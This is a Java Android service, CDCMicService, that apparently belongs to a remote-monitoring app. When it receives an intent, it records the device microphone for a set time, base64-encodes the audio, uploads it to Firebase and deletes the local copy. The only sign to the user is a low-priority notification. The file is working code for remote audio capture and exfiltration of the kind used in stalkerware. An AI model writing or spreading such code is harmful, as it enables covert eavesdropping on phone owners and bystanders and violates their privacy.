package com.vikasyadavnsit.cdc.services;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.util.Base64;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;
import com.vikasyadavnsit.cdc.utils.LoggerUtils;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class CDCMicService extends Service {

    private static final String TAG = "CDCMicService";
    private static final String CHANNEL_ID = "mic_service_channel";
    private MediaRecorder recorder;
    private String tempPath;
    private boolean shouldPersist = false;
    private final Handler handler = new Handler();

    @Override
    public void onCreate() {
        super.onCreate();
        File cacheDir = getExternalCacheDir();
        if (cacheDir != null) {
            tempPath = cacheDir.getAbsolutePath() + "/temp_audio.m4a";
        }
        createNotificationChannel();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Mic Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private void startForegroundWithNotification() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentTitle("Microphone Active")
                .setContentText("Hardware is being used for recording")
                .setPriority(NotificationCompat.PRIORITY_LOW);
        
        startForeground(4, builder.build());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForegroundWithNotification();
        String action = intent != null ? intent.getAction() : null;
        LoggerUtils.d(TAG, "onStartCommand: action=" + action);
        if ("START_RECORDING".equals(action)) {
            long duration = intent.getLongExtra("duration", 30000); 
            shouldPersist = intent.getBooleanExtra("persist", false);
            LoggerUtils.i(TAG, "Starting audio recording for " + duration + "ms, persist=" + shouldPersist);
            startRecording(duration);
        } else if ("STOP_RECORDING".equals(action)) {
            LoggerUtils.i(TAG, "Stopping audio recording manually");
            stopRecording();
        }
        return START_NOT_STICKY;
    }

    private void startRecording(long duration) {
        if (recorder != null) {
            LoggerUtils.w(TAG, "startRecording: Recorder already active");
            return;
        }

        try {
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(tempPath);
            recorder.prepare();
            recorder.start();
            LoggerUtils.d(TAG, "Hardware MIC opened and recording");

            if (duration > 0) {
                handler.postDelayed(this::stopRecording, duration);
            }
        } catch (IOException e) {
            LoggerUtils.e(TAG, "Critical error during audio start: " + e.getMessage());
            recorder = null;
        }
    }

    private void stopRecording() {
        if (recorder == null) return;
        handler.removeCallbacksAndMessages(null);

        try {
            recorder.stop();
            recorder.release();
            recorder = null;
            LoggerUtils.i(TAG, "Recording stopped successfully. File size: " + (new File(tempPath).length()) + " bytes");
            uploadAudio();
        } catch (Exception e) {
            LoggerUtils.e(TAG, "Error while stopping recorder: " + e.getMessage());
        }
    }

    private void uploadAudio() {
        File file = new File(tempPath);
        if (!file.exists()) {
            LoggerUtils.w(TAG, "Upload cancelled: temporary audio file not found");
            return;
        }

        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] bytes = new byte[(int) file.length()];
            fis.read(bytes);
            String base64 = Base64.encodeToString(bytes, Base64.DEFAULT);
            FirebaseUtils.uploadAudio(base64, shouldPersist);
            LoggerUtils.i(TAG, "Audio upload to Firebase initiated (" + base64.length() + " chars), persist=" + shouldPersist);
            file.delete();
        } catch (IOException e) {
            LoggerUtils.e(TAG, "Failed to read/upload audio file: " + e.getMessage());
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        stopRecording();
        super.onDestroy();
    }
}
